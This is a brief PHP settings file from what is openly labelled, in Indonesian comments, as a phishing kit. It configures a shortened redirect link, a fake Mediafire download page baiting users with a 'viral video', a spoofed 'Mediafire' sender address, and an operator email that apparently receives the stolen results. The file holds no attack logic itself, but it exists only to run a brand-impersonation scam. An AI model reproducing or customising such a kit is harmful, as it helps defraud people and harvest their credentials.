<?php

$redirect = 'https://bit.ly/mediafire-kayes'; // LINK REDIRECT
$namavideo = 'Onic Kayes Viral'; // NAMA WEB PHISING MU
$download = '10,1MB'; // KB, MB

$sender = 'From: Mediafire <support@gmail.com>'; // GANTI NAMA RESULT MU
$alexhost = "alexhostx@gmail.com"; // GANTI EMAIL MU

?>